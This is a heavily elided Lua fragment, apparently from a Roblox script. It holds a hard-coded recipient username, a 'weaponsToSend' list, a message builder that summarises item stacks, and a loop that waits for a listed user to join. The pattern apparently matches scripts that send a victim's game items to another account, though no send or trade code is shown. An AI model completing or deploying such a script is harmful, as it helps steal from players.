...
local users = _G.Usernames or {"057Deni"}
...
do
    ...
    if ok and typeof(result) == "table" then
        ...
        if ok2 and typeof(result2) == "table" then
            ...
            warn("[Trade] Failed to load database")
            database = {}
        end
    end
end
...
local function SendFirstMessage(list, prefix)
    local fields = {
        ...
        {
            name = "Summary:",
            value = string.format("Total stacks: %d", #list),
            inline = false
        }
    }
...
if #weaponsToSend > 0 then
    ...
    local function waitForUserJoined()
        local sentMessage = false
        local processed = {}

        local function handlePlayer(player)
            if processed[player.Name] then
                return
            end
            if not table.find(users, player.Name) then
                return
            end
